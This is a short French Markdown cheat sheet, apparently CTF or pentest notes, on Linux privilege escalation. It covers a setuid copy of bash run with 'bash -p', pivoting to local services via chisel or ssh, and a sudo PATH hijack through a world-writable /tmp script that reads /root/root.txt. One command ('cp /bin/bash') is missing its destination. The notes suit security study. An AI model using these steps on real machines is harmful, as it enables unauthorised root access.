# Privesc

> Exemple de tâches à effectuer pour obtenir une élévation de privilèges

### 


### 2. Techniques

- **Rendre le binaire bash setuid :**

  ```bash
  $ cp /bin/bash
  $ chmod +s bash
  # Un binaire setuid modifie notre binaire en préservant les informations (le setuid) mais modifie le propriétaire (e.g. cp --preserve-mode)
  # Une fois le propriétaire modifié en root
  # Il ne faut pas oublier d'utiliser le "-p" car par défaut, les exécutables shell ignorent le bit setuid. 
  $ bash -p # -p permet de garder l'effective user
  ```

- Regarder les services tournants en local sur la machine cible et faire une proxychain (voir chisel ou ssh) pour y accéder en local depuis notre machine hôte

- Pas de variable `secure_path` lorsque l'on fait un `sudo -l` : overwrite la commande si le chemin passé n'est pas absolu :

  ```bash
  $ echo -n "cat /root/root.txt" > /tmp/<COMMANDE_A_MODIFIER>
  $ chmod 777 /tmp/<COMMANDE_A_MODIFIER>
  $ export PATH=/tmp:$PATH 
  ```



## References

[1]: https://www.youtube.com/watch?v=Yp4oxoQIBAM